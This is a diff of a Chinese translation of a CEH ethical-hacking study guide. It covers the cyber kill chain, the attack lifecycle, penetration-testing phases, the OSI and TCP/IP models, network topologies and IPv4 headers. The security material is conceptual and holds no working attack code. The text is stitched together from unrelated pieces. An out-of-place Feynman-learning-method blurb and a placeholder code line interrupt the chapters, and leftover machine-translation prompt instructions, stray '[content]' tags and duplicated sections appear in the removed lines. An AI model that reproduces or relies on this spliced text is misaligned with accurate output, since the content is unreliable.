 
@@ -1651,7 +1822,7 @@ EC‑Council 通过要求获得 Certified Ethical Hacker（CEH）认证的任何
 
 攻击者在确定目标后，需要决定如何进行攻击。这里涉及 `武器化`。攻击者可能会创建针对目标的定制恶意软件，也可能使用常见的商用恶意软件（COTS），但后者有可能被受害环境中的防病毒软件检测到。攻击者可能认为这不重要，于是会向更多个人发送恶意软件。
 
-`交付` 是将武器（恶意软件或指向恶意网站的链接）送入受害者环境的过程。这可能是网络基础设施上的攻击，利用 exposed service 进行远程利用；也可能是通过电子邮件附件发送，或是将恶意软件托管在受害者常访问的 Web 服务器上，受害者访问时即被感染。`利用` 阶段指恶意软件感染受害者系统的过程。
+`交付` 是将武器（恶意软件或指向恶意网站的链接）送入受害者环境的过程。这可能是网络基础设施上的攻击，利用 `exposed service` 进行远程利用；也可能是通过电子邮件附件发送，或是将恶意软件托管在受害者常访问的 Web 服务器上，受害者访问时即被感染。`利用` 阶段指恶意软件感染受害者系统的过程。
 
 `利用` 导致 `安装`。攻击者会在系统上安装额外软件以保持访问权限，并可能获得远程访问。安装完成后，攻击者进入 `命令与控制 (C2 / C&C)` 阶段。该阶段提供攻击者对受感染系统的远程访问，可能通过安装额外软件或发送指令实现。攻击者可能试图窃取信息，或让系统参与大规模拒绝服务攻击。
 
@@ -1659,32 +1830,27 @@ EC‑Council 通过要求获得 Certified Ethical Hacker（CEH）认证的任何
 
 ### 攻击生命周期
 
-安全技术和咨询公司 **Mandiant** 经常使用另一种称为 `攻击生命周期` 的方法论。它不同于网络杀链，但也有一些相似之处。攻击生命周期描述的是攻击者实际操作的过程，适用于自 computing infrastructure 诞生以来的所有攻击。回顾 **Chaos Computer Club** 在 1980 年代的活动，或 **Kevin Mitnick** 及其同僚在 1970 年代末至 1980 年代及以后的行为，可以直接映射到攻击生命周期中。Figure 1.2 展示了攻击生命周期的结构。
+安全技术和咨询公司 `Mandiant` 经常使用另一种称为 `攻击生命周期` 的方法论。它不同于网络杀链，但也有一些相似之处。攻击生命周期描述的是攻击者实际操作的过程，适用于自 `computing infrastructure` 诞生以来的所有攻击。回顾 `Chaos Computer Club` 在 1980 年代的活动，或 `Kevin Mitnick` 及其同僚在 1970 年代末至 1980 年代及以后的行为，可以直接映射到攻击生命周期中。Figure 1.2 展示了攻击生命周期的结构。
 
-与网络杀链的一个显著区别在于 **攻击往往不是一次性完成**。中间会出现循环。攻击者在进入网络后，不会再从外部不断发起攻击。一旦进入环境，他们会利用被 compromized 的系统作为内部进一步 compromize 的跳板。攻击者获得系统后，会利用该系统以及发现的凭证等信息，进一步横向移动到其他系统。在此之前，攻击者会在 `初始侦察` 阶段识别目标和潜在攻击点。此阶段的侦察包括利用公开来源（如社交网络）获取姓名和职务等信息，以生成钓鱼攻击。这是 `初始 compromize` 阶段。
+与网络杀链的一个显著区别在于 `攻击往往不是一次性完成`。中间会出现循环。攻击者在进入网络后，不会再从外部不断发起攻击。一旦进入环境，他们会利用被 `compromized` 的系统作为内部进一步 `compromize` 的跳板。攻击者获得系统后，会利用该系统以及发现的凭证等信息，进一步横向移动到其他系统。在此之前，攻击者会在 `初始侦察` 阶段识别目标和潜在攻击点。此阶段的侦察包括利用公开来源（如社交网络）获取姓名和职务等信息，以生成钓鱼攻击。这是 `初始 compromize` 阶段。
 
 ![FIGURE 1.2 Attack life cycle](img/c01f002.png)
 
 **FIGURE 1.2** 攻击生命周期
 
-系统被 compromize 后，攻击者会努力 `建立立足点`，确保在需要时能够重新进入系统。需要认识到，这些攻击并非“bang‑bang”式的快速完成，可能需要数天或数周才能从一个阶段转移到下一阶段，这取决于执行攻击的组织。这些攻击者是组织而非个人，不同员工可能负责不同的阶段。
+系统被 `compromize` 后，攻击者会努力 `建立立足点`，确保在需要时能够重新进入系统。需要认识到，这些攻击并非“bang‑bang”式的快速完成，可能需要数天或数周才能从一个阶段转移到下一阶段，这取决于执行攻击的组织。这些攻击者是组织而非个人，不同员工可能负责不同的阶段。
 
 要继续后续操作，攻击者必须 `提升权限`，获得管理员权限以便在环境中循环移动，进一步收集系统。此阶段他们会从记忆体或磁盘中提取凭证，并调查系统与其他系统的连接关系，这属于 `内部侦察`。他们可能还在寻找系统中已知的其他凭证。
 
-侦察是实现 `横向移动`（亦称 east‑west movement）的前提。攻击者需了解组织内部的系统布局，可能是服务器，也可能是个人工作站。在企业网络中，攻击者可以使用捕获的凭证对其他工作站进行认证，从而访问不同的服务器集合。
+侦察是实现 `横向移动`（亦称 `east‑west movement`）的前提。攻击者需了解组织内部的系统布局，可能是服务器，也可能是个人工作站。在企业网络中，攻击者可以使用捕获的凭证对其他工作站进行认证，从而访问不同的服务器集合。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 `Richard Feynman`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 在完成这项工作的过程中，你可能会泄露目标公司员工的个人信息。这在社会工程攻击时会派上用场。这类攻击屡见不鲜。事实上，一些估计表明 80 到 90 百分比的渗透都是由这类社会工程攻击导致的。它们并非获取网络访问的唯一手段，但通常是最容易的入口。
 
@@ -1692,13 +1858,13 @@ if (condVar > someVal) {console.log("xxx")}
 
 一旦你识别出网络段，就会希望找出这些网络段内可访问的系统；这就是扫描与枚举阶段。更重要的是，你需要识别在任何可用主机上运行的服务。最终，这些服务将作为入口点。目标是获得访问，这可能通过暴露的网络服务实现。这不仅包括所有打开端口的列表（这将是有用的信息），还包括每个开放端口背后的服务身份和运行的软件。
 
-这也可能导致收集不同服务提供的信息。这包括提供服务的软件，例如 Web 服务器上的 NGINX、Apache 或 IIS。此外，还有服务会提供不只是软件信息，甚至组织内部的细节，例如用户名。例如，某些 SMTP 服务器在正确查询时会泄露有效的用户名。使用 Server Message Block (SMB) 或 Common Internet File System (CIFS) 协议的 Windows 服务器可以被询问以获取信息，例如共享的目录、用户名，甚至一些策略信息。该阶段的目标是尽可能多地收集信息，为进入下一阶段提供起点。随着网络规模和企业规模的扩大，这一阶段可能会耗时较长。收集到的细节越多，后续阶段就越容易。
+这也可能导致收集不同服务提供的信息。这包括提供服务的软件，例如 Web 服务器上的 `NGINX`、`Apache` 或 `IIS`。此外，还有服务会提供不只是软件信息，甚至组织内部的细节，例如用户名。例如，某些 SMTP 服务器在正确查询时会泄露有效的用户名。使用 `Server Message Block (SMB)` 或 `Common Internet File System (CIFS)` 协议的 Windows 服务器可以被询问以获取信息，例如共享的目录、用户名，甚至一些策略信息。该阶段的目标是尽可能多地收集信息，为进入下一阶段提供起点。随着网络规模和企业规模的扩大，这一阶段可能会耗时较长。收集到的细节越多，后续阶段就越容易。
 
 ## 获得访问
 
-获得访问是许多人认为渗透测试最重要的部分，对许多人来说也是最有趣的。这里你可以展示某些服务可能存在的漏洞。你通过利用该服务来实现。当你 compromising 系统或窃取数据并能够证明时，理论上的或假阳性就不存在。这凸显了伦理黑客的重要方面：文档记录。仅仅说 “我做了这件事” 是不够的。你需要以某种方式展示或证明你确实 compromising 了系统。
+获得访问是许多人认为渗透测试最重要的部分，对许多人来说也是最有趣的。这里你可以展示某些服务可能存在的漏洞。你通过利用该服务来实现。当你 `compromising` 系统或窃取数据并能够证明时，理论上的或假阳性就不存在。这凸显了伦理黑客的重要方面：文档记录。仅仅说 “我做了这件事” 是不够的。你需要以某种方式展示或证明你确实 `compromising` 了系统。
 
-技术性攻击，如针对监听网络服务的漏洞利用，有时被认为是系统被 compromising 的方式，但事实是社会工程攻击更可能是攻击者获得访问的途径。这也是为什么枚举很重要 —  — 因为你需要社会工程攻击的目标。进行社会工程攻击的方式有很多种，包括通过电子邮件向机器注入恶意软件，或诱使用户提供可用于其他方式的信息（例如用户名和密码）。
+技术性攻击，如针对监听网络服务的漏洞利用，有时被认为是系统被 `compromising` 的方式，但事实是社会工程攻击更可能是攻击者获得访问的途径。这也是为什么枚举很重要 —  — 因为你需要社会工程攻击的目标。进行社会工程攻击的方式有很多种，包括通过电子邮件向机器注入恶意软件，或诱使用户提供可用于其他方式的信息（例如用户名和密码）。
 
 另一种从用户那里获取信息的手段是让他们访问一个网站。这可能是你作为攻击者加载了恶意软件的网站，用于感染他们的系统。或者，如前所述，你可能在询问他们信息。这里提到的恶意软件出现了两次。了解恶意软件的工作原理及其使用场景对于获得访问至关重要。
 
@@ -1706,13 +1872,13 @@ if (condVar > someVal) {console.log("xxx")}
 
 ## 维持访问
 
-一旦你进入系统，模仿常见的攻击模式意味着你应该保持访问。如果你成功 compromising 了用户的系统，用户关闭系统后你将失去访问。这可能意味着你需要重新 compromising 该系统。由于 exploit 不总是有效，你下次尝试时可能无法再次进入。此外，你可能使用的 compromise 依赖于一个已经被修补的漏洞。下一次尝试可能失败，因为该漏洞已不存在。你需要为自己提供其他进入系统的方式，以确保你能够继续观察该系统的状态，甚至整个企业网络的情况。
+一旦你进入系统，模仿常见的攻击模式意味着你应该保持访问。如果你成功 `compromising` 了用户的系统，用户关闭系统后你将失去访问。这可能意味着你需要重新 `compromising` 该系统。由于 `exploit` 不总是有效，你下次尝试时可能无法再次进入。此外，你可能使用的 `compromise` 依赖于一个已经被修补的漏洞。下一次尝试可能失败，因为该漏洞已不存在。你需要为自己提供其他进入系统的方式，以确保你能够继续观察该系统的状态，甚至整个企业网络的情况。
 
-此阶段恶意软件可能很有用。你可能需要安装根套件（rootkit），它可以为你提供后门以及隐藏自身和行为的手段。你可能需要在系统上安装额外的软件以保持访问。这可能需要在你完成初始 compromising 后将软件复制到目标系统上。
+此阶段恶意软件可能很有用。你可能需要安装根套件（rootkit），它可以为你提供后门以及隐藏自身和行为的手段。你可能需要在系统上安装额外的软件以保持访问。这可能需要在你完成初始 `compromising` 后将软件复制到目标系统上。
 
-因此，这一阶段并非看似那么简单。可能会有多种因素阻碍你保持访问。不过，保持访问的方法有很多。不同的操作系统允许不同的技术，但每个操作系统版本或更新可能使某些技术变得更难。伦理黑客的实践取决于具体情境，这也是其挑战所在。没有单一答案或简明的方法。一个 Windows 10 系统可能因为缺少可用的补丁而容易被 compromising，而另一个 Windows 10 系统可能因为已是最新版本并加强了权限和其他设置而难以入侵。
+因此，这一阶段并非看似那么简单。可能会有多种因素阻碍你保持访问。不过，保持访问的方法有很多。不同的操作系统允许不同的技术，但每个操作系统版本或更新可能使某些技术变得更难。伦理黑客的实践取决于具体情境，这也是其挑战所在。没有单一答案或简明的方法。一个 Windows 10 系统可能因为缺少可用的补丁而容易被 `compromising`，而另一个 Windows 10 系统可能因为已是最新版本并加强了权限和其他设置而难以入侵。
 
-维持访问通常称为 `*persistence*`。这是安装任何持久访问机制的阶段。无论用户是否注销或重启系统，攻击者都可以继续访问。常见做法是安装能够向互联网上的系统发送 beacon（回连）的软件。原因是入站访问通常被防火墙阻止，而出站访问往往在网络内部是完全不受限制的。
+维持访问通常称为 `persistence`。这是安装任何持久访问机制的阶段。无论用户是否注销或重启系统，攻击者都可以继续访问。常见做法是安装能够向互联网上的系统发送 `beacon`（回连）的软件。原因是入站访问通常被防火墙阻止，而出站访问往往在网络内部是完全不受限制的。
 
 ### 隐藏痕迹
 
@@ -1724,17 +1890,15 @@ if (condVar > someVal) {console.log("xxx")}
 
 很难过度强调伦理的重要性。你在签署 CEH 认证并通过考试时，会被要求遵守职业伦理准则。你必须始终以专业的方式对待客户和雇主。你需要成为任何受托数据的负责任守护者。
 
-
-
 # 网络基础
 
 虽然本章的内容不太可能直接出现在考试中，但假设你不需要了解这些材料才能在本书其余部分以及考试中取得成功是一个错误。你可能能够学会使用工具，但如果在操作时遇到问题，你将无法理解发生了什么，除非拥有大量的基础知识。这些内容曾经是考试的一部分，现在仍然是理解如何成为成功的伦理黑客所必需的深入知识。
 
-要理解网络的工作原理，了解协议如何组合在一起的概念性理解会很有帮助。有一个用于描述通信协议及其功能的概念模型。还有一种描述这些功能的方式，有时称为 *模型*，但它更像是一种已构建的架构设计。本章将介绍 OSI（开放系统互联）模型和 TCP/IP 架构。
+要理解网络的工作原理，了解协议如何组合在一起的概念性理解会很有帮助。有一个用于描述通信协议及其功能的概念模型。还有一种描述这些功能的方式，有时称为 `模型`，但它更像是一种已构建的架构设计。本章将介绍 OSI（开放系统互联）模型和 TCP/IP 架构。
 
 你需要理解网络拓扑结构。拓扑结构通常是概念性的，可以用来逻辑地组织系统，观察它们的连接方式。这将引导我们讨论网络的物理元件，包括地址方式。最终，当我们进行系统网络时，我们希望它们能够相互通信。为此，每个系统都需要一种被其他系统用来定位的方式。正如你将看到，每个系统会拥有多个地址。这回溯到前文提到的模型，因为不同的地址是通过不同层的功能进行通信的方式。
 
-当我们从物理组件向上移动网络栈时，我们将开始讨论你可能最熟悉的协议：Internet Protocol（IP）、传输控制协议（TCP）和用户数据报协议（UDP）。这些协议是基础性的，你需要扎实掌握它们，不仅用于系统测试，还用于指导公司如何通过修复漏洞来降低风险。
+当我们从物理组件向上移动网络栈时，我们将开始讨论你可能最熟悉的协议：`Internet Protocol（IP）`、`传输控制协议（TCP）`和`用户数据报协议（UDP）`。这些协议是基础性的，你需要扎实掌握它们，不仅用于系统测试，还用于指导公司如何通过修复漏洞来降低风险。
 
 在公司中，尤其是为外部用户或客户提供 IT 服务的常见做法是使用服务提供商。云计算可以被视为这种外包的实现形式。利用这些服务提供商并与已将系统和服务交付给它们的组织合作，会为进行安全评估或渗透测试带来特定的挑战。因此，了解这些外部服务提供商的工作方式至关重要。
 
@@ -1742,7 +1906,7 @@ if (condVar > someVal) {console.log("xxx")}
 
 我们通过系统的地址来访问它们。问题是，每个系统会拥有多个地址。这些地址最好按照所属协议的功能进行分组。第一种通信模型，从我们将要讨论的内容以及历史的角度来看（它本质上最先出现），更具概念性而非严格实用性。我将随后提供一个实用的模型。
 
-这些通信模型被划分为层，层是相互堆叠的。由于它们呈现为层级堆叠，你常常会听到它们被称为 *网络栈* 或 *协议栈*。需要注意的一个重要方面是，这些层是独立的，功能各异。当两个系统通信时，每个系统都有这些概念层，层 C 在第一个系统只能与层 C 通信，而不能与第二个系统的层 B、A 或 D 通信，因为两侧层 C 的协议匹配。其他层也同理。例如，你可以在 Figure 2.1 看到一组网络头信息。该头信息在发送方所在层/功能生成的，只能被接收方相同层/功能读取。
+这些通信模型被划分为层，层是相互堆叠的。由于它们呈现为层级堆叠，你常常会听到它们被称为 `网络栈` 或 `协议栈`。需要注意的一个重要方面是，这些层是独立的，功能各异。当两个系统通信时，每个系统都有这些概念层，层 C 在第一个系统只能与层 C 通信，而不能与第二个系统的层 B、A 或 D 通信，因为两侧层 C 的协议匹配。其他层也同理。例如，你可以在 Figure 2.1 看到一组网络头信息。该头信息在发送方所在层/功能生成的，只能被接收方相同层/功能读取。
 
 ![FIGURE 2.1 网络头信息](img/c02f001.png)
 
@@ -1750,46 +1914,54 @@ if (condVar > someVal) {console.log("xxx")}
 
 当我们逐一介绍这两种通信模型时，我会讨论每一层存在的功能以及该层上的协议。完成后，你将拥有两种不同但相似的方式来理解协议在系统之间如何通信，以及系统/应用之间的消息如何组合。
 
-将网络通信功能划分为层意味着功能化（模块化）。这使得可以从协议链中提取某一协议并插入其他协议。相同的协议可以在以太网、SONET 或帧中继等不同介质上工作。这些协议虽然提供相同的能力，但实现方式各异。这是因为每一层的功能被抽象化，层之间可以在不需要知道细节的前提下进行通信，因为功能已知。具体的协议并不重要，关键在于每一层都有许多不同的协议，无论使用哪种模型。
+将网络通信功能划分为层意味着功能化（模块化）。这使得可以从协议链中提取某一协议并插入其他协议。相同的协议可以在以太网、`SONET` 或帧中继等不同介质上工作。这些协议虽然提供相同的能力，但实现方式各异。这是因为每一层的功能被抽象化，层之间可以在不需要知道细节的前提下进行通信，因为功能已知。具体的协议并不重要，关键在于每一层都有许多不同的协议，无论使用哪种模型。
 
 ### 开放系统互联
 
 在 1970 年代末之前，通信系统使用专有协议，这使得概念化正在发生的事情变得困难。每个协议都以不同的方式定义通信。1970 年代末，国际标准化组织（ISO）启动了定义通信标准的过程，旨在提升不同供应商之间的互操作性。如果功能被概念性拆分，接口点更清晰，因而更易交互。
 
-1978 年，首次发布了一个初始模型。经过修正后，它被正式发布为 OSI 模型。虽然曾有人担心该模型的复杂性以及其实际实现的可能性，但它仍然是帮助明确网络栈中功能边界的可靠模型。OSI 模型包含七层。网络专业人员在指代特定功能时，常用层编号来表示。我们稍后会看到这如何操作。
+1978 年，首次发布了一个初始模型。经过修正后，它被正式发布为 `OSI 模型`。虽然曾有人担心该模型的复杂性以及其实际实现的可能性，但它仍然是帮助明确网络栈中功能边界的可靠模型。`OSI 模型` 包含七层。网络专业人员在指代特定功能时，常用层编号来表示。我们稍后会看到这如何操作。
 
-Figure 2.2 展示了 OSI 模型的七层，将在随后详细说明。栈的底层是物理层，向上工作直至我们讨论应用层直接使用的协议。
+Figure 2.2 展示了 `OSI 模型` 的七层，将在随后详细说明。栈的底层是物理层，向上工作直至我们讨论应用层直接使用的协议。
 
 ![FIGURE 2.2 OSI 模型的七层](img/c02f002.png)
 
 **FIGURE 2.2** OSI 模型的七层
 
+
+
 由于消息是从应用层向下创建的，我们将从上往下依次讨论每一层的角色和功能。虽然记忆层顺序的记忆法通常从下往上，但只要记住任意顺序并能对应每层的功能，你就已经具备了必要条件。
 
-*   **应用层（第 7 层）**   应用层最近位于终端用户之处。这并不意味着它就是应用本身。我们讨论的是协议。应用层协议管理应用的通信需求，可能识别资源并协助与之交互。例如，超文本传输协议（HTTP）是应用层协议，负责在客户端和服务器之间协商资源（页面等）的获取。
+## 应用层（第 7 层）
 
+应用层最近位于终端用户之处。这并不意味着它就是应用本身。我们讨论的是协议。应用层协议管理应用的通信需求，可能识别资源并协助与之交互。例如，超文本传输协议（HTTP）是应用层协议，负责在客户端和服务器之间协商资源（页面等）的获取。
 
+## 物理层 (Layer 1)
 
-
-# 物理层 (Layer 1)
 这一层可能不言自明。这是所有管理物理通信的协议。`10BaseT`、`10Base2`、`100BaseTX` 和 `1000BaseT` 都是物理层协议的例子。它们规定了线路上脉冲的处理方式。
 
-# 数据链路层 (Layer 2)
+## 数据链路层 (Layer 2)
+
 另一个需要应对的地址是媒体访问控制 (MAC) 地址。这是二层地址，用于标识网络中的网络接口，以便在本地网络上将系统之间的通信传递。地址解析协议 (ARP)、虚拟局域网 (VLAN)、以太网 (Ethernet) 和帧中继 (Frame Relay) 是数据链路层协议。它们负责格式化数据以便在传输介质上发送。
 
-# 网络层 (Layer 3)
+## 网络层 (Layer 3)
+
 网络层负责将消息从一个端点传递到另一个端点。它通过处理地址和路由来实现这一点。IP 是一种在该层上存在或运行的协议。
 
-# 传输层 (Layer 4)
+## 传输层 (Layer 4)
+
 传输层负责为传输分段消息。传输层还负责通信的复用。TCP 和 UDP 都是传输协议。这些协议使用端口进行地址，因此接收系统知道将流量传递到哪个应用程序。
 
-# 会话层 (Layer 5)
+## 会话层 (Layer 5)
+
 会话层在端点之间管理通信，以维护应用程序（客户端或服务器）的通信。远程过程调用 (RPC) 是会话层的一个功能示例。文件共享的组件也位于会话层，因为端点之间的通信协商需要在此层进行。应用层负责管理资源，而会话层负责确保文件等数据成功传输并完整。
 
-# 表示层 (Layer 6)
+## 表示层 (Layer 6)
+
 表示层负责为应用层准备数据。它确保传递给应用的数据格式正确，以便被消费。当系统通信时，两端之间可能存在格式不一致的问题，表示层确保数据格式正确。因此，ASCII（美国信息交换代码）、Unicode 以及 EBCDIC（扩展二进制十进制代码）等字符编码格式都位于表示层。此外，JPEG 格式也被认为位于表示层。
 
-# 应用层 (Layer 7)
+## 应用层 (Layer 7)
+
 应用层负责管理资源，而会话层负责确保文件等数据成功传输并完整。
 
 OSI 模型的一个问题在于，有时难以将协议准确映射到七层。问题常出现在会话层和应用层之间。例如，安全壳 (SSH) 协议在哪一层？是会话层，因为它最终管理会话，还是表示层，因为它包含加密机制并进行协商？其他协议似乎存在于层与层之间。例如，ARP 被认为在数据链路层运行，但它需要了解网络层，因为它在两层之间提供地址桥梁。
@@ -1797,13 +1969,14 @@ OSI 模型的一个问题在于，有时难以将协议准确映射到七层。�
 不过，模型在概念化时会有帮助。例如，你家里可能有一个让人困惑的设备。你可能称它为路由器，也可能听别人这么说。问题是路由是三层功能（如前所述），而设备中还有严格二层的功能，比如交换端口在本地网络上传输消息，而不涉及路由。此外，设备完全可能不进行路由，而是桥接到提供商的网络。这取决于设备的工作方式以及提供商对设备的期望。正是在这里，理解不同层的作用有所帮助。你可以更好地定位可能的问题，因为你可以隔离功能。
 
 ### TCP/IP 架构
+
 20 世纪 60 年代末，ARPANET 首次被开发并实施。随后几年，网络规模迅速扩大，远超 1968–69 年最初仅有两三个节点的规模。随着更多系统接入网络，负责网络管理和协议开发的工程师们积累了大量经验。最初的协议是 1822 协议，用于向接口消息处理器 (IMP) 发送通信，IMP 是一台配备专用接口的大型计算机，充当消息网关（可视作原始路由器）。1822 协议随后被网络控制程序 (NCP) 取代。
 
-到 1983 年，经过多年的发展，NCP 被完全替换为如今常被称为传输控制协议 (TCP) / 互联网协议 (IP) 的协议套件。TCP/IP 协议栈内部协议使用方式的描述与 OSI 模型的描述略有不同。TCP/IP 实现后，协议的概念设计被描述出来。因此，这个套件有时被称为 *model*，也可能被称为 *architecture*，因为它是对已建成设计的描述，而非纯概念。OSI 模型完全是概念性的，并不描述任何具体事物。
+到 1983 年，经过多年的发展，NCP 被完全替换为如今常被称为传输控制协议 (TCP) / 互联网协议 (IP) 的协议套件。TCP/IP 协议栈内部协议使用方式的描述与 OSI 模型的描述略有不同。TCP/IP 实现后，协议的概念设计被描述出来。因此，这个套件有时被称为 `model`，也可能被称为 `architecture`，因为它是对已建成设计的描述，而非纯概念。OSI 模型完全是概念性的，并不描述任何具体事物。
 
 TCP/IP 架构的设计比 OSI 模型更为简洁，这也是其即时差异所在，反映了已建成的设计与 OSI 的概念设计之间的区别。OSI 模型为了兼容多种协议和设计，必须保持抽象和灵活，因而被划分为前文所述的七个功能类别。而 TCP/IP 作为已建成的定义，仅包含四层。
 
-这并不意味着 OSI 模型与 TCP/IP 架构之间没有关联。正如你在 Figure 2.3 可以看到的，两者有很多相似之处。
+这并不意味着 OSI 模型与 TCP/IP 架构之间没有关联。正如你在 `Figure 2.3` 可以看到的，两者有很多相似之处。
 
 ![FIGURE 2.3 The TCP/IP architecture layers](img/c02f003.png)
 
@@ -1816,8 +1989,6 @@ TCP/IP 架构的设计比 OSI 模型更为简洁，这也是其即时差异所�
 在本章余下部分以及我在实际工作中经常遇到的情况，提到“层”时，通常指的是 OSI 模型而非 TCP/IP 架构。
 
 ## Topologies
-
-
 
 # 网络拓扑模型
 
@@ -1867,45 +2038,33 @@ In spite of a ring network behaving like a bus network, there isn't a need for t
 
 ## Mesh Network
 
-In another topology, systems are wired directly to one another. Figure 2.7 shows an example. This looks a little as though they are wired in a ring, but it's more like peer to peer. To get from one system to another, if they are not wired together directly, a system has to pass through another system. Mesh networks will typically avoid another potential problem with a bus network. If a system in the middle of the bus network fails, there is a potential for the entire network to fail along with it. The system essentially acts like a terminator by not allowing the electrical signal to pass through it. If a system in a mesh network fails, there is probably another pathway to get between one system and another.
-
-![FIGURE 2.7 Mesh network](img/c02f007.png)
-
-**FIGURE 2.7** Mesh network
-
-While you can connect systems together in multiple ways in a mesh network, in spite of the orderliness that the circular design of the network shows, a couple of failures can potentially isolate nodes in a mesh network. The way around that is to add connections. The more pathways to get from one system to another, the less chance failure will be catastrophic, meaning communication doesn't happen. You can keep adding connections until every system has connections to every other system on the network. You can see an example of this type of design in Figure 2.8. What you see in the diagram is what's called a `full mesh network`. Every system in the network has a connection to every other system.
-
-![FIGURE 2.8 Full mesh network](img/c02f008.png)
-
-**FIGURE 2.8** Full mesh network
 
 
+在另一种拓扑中，系统之间直接相互连接。图 2.7 展示了一个示例。这看起来有点像环形布线，但实际上更接近对等网络。若两台系统并非直接相连，则从一台系统到另一台系统必须经过其他系统。网状网络通常还能避免总线网络的另一个潜在问题：如果位于总线网络中部的系统发生故障，则可能导致整个网络随之失效。该系统本质上相当于一个终结器，使电信号无法通过它继续传播。如果网状网络中某台系统发生故障，通常仍会有其他通路可以连通两台系统。
 
-粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。  
-内联代码（`code`）和代码块不需要翻译。  
-链接（[link](https://example.org)）需要翻译其内容，但保留网址。  
-列表，表格，引用块保留格式，翻译内容  
-原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！  
-输出应包含在“[content]...[/content]”中  
+![图 2.7 网状网络](img/c02f007.png)
 
-译文：
+**图 2.7 网状网络**
 
-[content]
--   [Feynman's learning method](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
+在网状网络中，虽然你可以用多种方式将系统连接在一起，但尽管网络的环形设计看似规整，个别故障仍有可能使网状网络中的节点被隔离。解决之道是增加连接。系统之间的通路越多，出现灾难性通信故障的概率就越低。你可以持续增加连接，直到每个系统都与网络中其他所有系统直接相连。图 2.8 展示了这类设计的一个示例。图中所示即为所谓 `full mesh network`（全网状网络）：网络中的每个系统都与其他所有系统建有连接。
 
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+![图 2.8 全网状网络](img/c02f008.png)
+
+**图 2.8 全网状网络**
+
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
+
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
--   [应对该挑战的几种方法。其中之一，如果你对开关有一定控制权，是告诉开关将某个端口的流量镜像到另一个端口。然后，你需要将发起攻击的系统连接到镜像端口。另一种方法是欺骗开关，使其将流量发送到你，这涉及到后续章节将介绍的攻击方法。  
+- 应对该挑战的几种方法。其中之一，如果你对开关有一定控制权，是告诉开关将某个端口的流量镜像到另一个端口。然后，你需要将发起攻击的系统连接到镜像端口。另一种方法是欺骗开关，使其将流量发送到你，这涉及到后续章节将介绍的攻击方法。
 
 ## IP
 
-进入网络层后，我们会接触到 IP。当然，网络层还有其他协议，例如 Internetwork Packet Exchange（IPX），但因为 Internet 基于 IP 及其相关协议运行，我们将专注于[content]IP[/content]。随着每一层传递，会为报文添加一段特定于处理该报文的协议的数据，这些数据称为 `headers`。每个协议拥有自己的 header 集合，随后会附加到报文上，形成全新的 PDU。对于 IP，这种 PDU 被称为 `packet`。你可能会听到网络上每一段数据都被称为 `packet`，但在技术层面上，来自 IP 头部的报文才是 packet。
+进入网络层后，我们会接触到 IP。当然，网络层还有其他协议，例如 Internetwork Packet Exchange（IPX），但因为 Internet 基于 IP 及其相关协议运行，我们将专注于 IP。随着每一层传递，会为报文添加一段特定于处理该报文的协议的数据，这些数据称为 `headers`。每个协议拥有自己的 header 集合，随后会附加到报文上，形成全新的 PDU。对于 IP，这种 PDU 被称为 `packet`。你可能会听到网络上每一段数据都被称为 `packet`，但在技术层面上，来自 IP 头部的报文才是 packet。
 
 地址也是需要考虑的方面。网络工程师通常很熟悉地址，但了解地址由什么构成是有价值的。地址关联的还有子网掩码。子网掩码可能难以理解，但一旦掌握一些数学技巧，就会变得容易。子网掩码还有几种不同的表示方式，你会经常看到这两种写法。
 
@@ -1917,41 +2076,39 @@ IP 被视为一种 best‑effort 协议。它尽力将数据包从源地址送�
 
 Internet Engineering Task Force（IETF）负责维护所有与协议相关的文档。当个人或更常见的群体想要提出新协议或对现有协议进行扩展时，他们会撰写所谓的 `request for comments`（RFC）文档。IETF 不仅维护 RFC，还管理它们的批准过程。第一个 RFC 于 1969 年撰写，内容是关于用于将计算机系统与 ARPANET 相连的 IMP（接入节点）的主机软件。当时 IETF 尚未成立，但使用 RFC 仍是制定规范和标准的过程。
 
-IPv4 的 RFC 于 1981 年发布，编号为 791。它定义了 IPv4 的工作方式以及 IPv4 使用的头部字段。Figure 2.9 展示了从网络上捕获的 IPv4 报文的头部集合。这正是 RFC 中以表格形式呈现的相同头部集合。表格形式的优势在于可以清晰看到每个字段的大小。
+IPv4 的 RFC 于 1981 年发布，编号为 791。它定义了 IPv4 的工作方式以及 IPv4 使用的头部字段。图 2.9 展示了从网络上捕获的 IPv4 报文的头部集合。这正是 RFC 中以表格形式呈现的相同头部集合。表格形式的优势在于可以清晰看到每个字段的大小。
 
-![FIGURE 2.9 IP headers](img/c02f009.png)
+![图 2.9 IP 头部](img/c02f009.png)
 
-**FIGURE 2.9** IP headers
+**图 2.9 IP 头部**
 
 下面列出了各个头部字段的描述及其长度：
 
-*   **Version**    该字段指示该数据包使用的 IPv4 版本，为 4 位。
+*   **Version**   该字段指示该数据包使用的 IPv4 版本，为 4 位。
 
-*   **Header Length**   该字段指示 IPv4 头部包含的字（32‑bit word）数量。由于头部基于 32‑bit 字（即 4 字节），可以通过将该值乘以 4 得到字节数。在此示例中，头部为 20 字节（5 字），这也是 IP 头部的常见长度。
+*   **Header Length**   该字段指示 IPv4 头部包含的字（32-bit word）数量。由于头部基于 32-bit 字（即 4 字节），可以通过将该值乘以 4 得到字节数。在此示例中，头部为 20 字节（5 字），这也是 IP 头部的常见长度。
 
-*   **Type of Service**   RFC 称之为 ToS 字段，也称为 differentiated services field。该字段帮助网络元素在 QoS 决策中对报文进行优先级排序，降低其他报文的优先级。它是 8 位（1 字节）的字段。
